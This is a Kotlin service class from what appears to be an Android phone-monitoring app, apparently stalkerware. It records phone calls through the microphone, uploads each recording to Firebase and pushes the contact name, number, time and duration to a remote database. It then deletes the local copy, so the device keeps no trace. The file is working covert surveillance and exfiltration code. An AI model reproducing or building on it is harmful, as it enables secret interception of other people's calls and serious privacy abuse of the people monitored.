package com.github.midros.istheapp.services.calls

import android.content.Context
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.util.Log
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.data.model.Calls
import com.github.midros.istheapp.services.base.BaseInteractorService
import com.github.midros.istheapp.utils.ConstFun.getDateTime
import com.github.midros.istheapp.utils.ConstFun.isAndroidM
import com.github.midros.istheapp.utils.Consts.ADDRESS_AUDIO_CALLS
import com.github.midros.istheapp.utils.Consts.CALLS
import com.github.midros.istheapp.utils.Consts.DATA
import com.github.midros.istheapp.utils.FileHelper
import com.github.midros.istheapp.utils.FileHelper.getFileNameCall
import com.github.midros.istheapp.utils.FileHelper.getContactName
import com.github.midros.istheapp.utils.FileHelper.getDurationFile
import com.github.midros.istheapp.utils.FileHelper.getFilePath
import com.github.midros.istheapp.utils.MediaRecorderUtils
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import java.io.File
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
    context: Context,
    firebase: InterfaceFirebase
) : BaseInteractorService<S>(context, firebase), InterfaceInteractorCalls<S> {

    private var recorder: MediaRecorderUtils = MediaRecorderUtils { deleteFile() }
    private var fileName: String? = null
    private var contact: String? = null
    private var phoneNumber: String? = null
    private var type: Int = 0
    private var recording: Int = 0
    private var dateTime: String? = null

    override fun startRecording(phoneNumber: String?, type: Int) {

        this.type = type
        this.phoneNumber = phoneNumber
        dateTime = getDateTime()
        contact = getContext().getContactName(phoneNumber)
        fileName = getContext().getFileNameCall(phoneNumber, dateTime)
        Log.i("llamada", "startRecording")
        if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()) {
            recording = 1
            if (isAndroidM())
                recorder.startRecording( MediaRecorder.AudioSource.MIC,  fileName  ) //.VOICE_COMMUNICATION
            else
                recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
        }
        else
            recording = 0
    }

    override fun stopRecording() {
        if (recording == 1)
            recorder.stopRecording { sendFileCall() }
    }

    private fun deleteFile() {
        FileHelper.deleteFile(fileName)
        if (recording == 1)
            File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
        recording = 0
        if (getService() != null)
            getService()!!.stopServiceCalls()
    }

    private fun sendFileCall() {
        val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
        val dateNumber = fileName!!.replace("$filePath/", "").replace(",","")
        val uri = Uri.fromFile(File(fileName))
        getService()!!.addDisposable(firebase().putFile("$CALLS/$dateNumber", uri)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({
                setPushName()
                       },
                {
                deleteFile()
            })
        )
    }

    private fun setPushName() {
        val duration = getDurationFile(fileName!!)
        val calls = Calls(contact, phoneNumber, dateTime, duration, type)
        firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
        deleteFile()
    }


}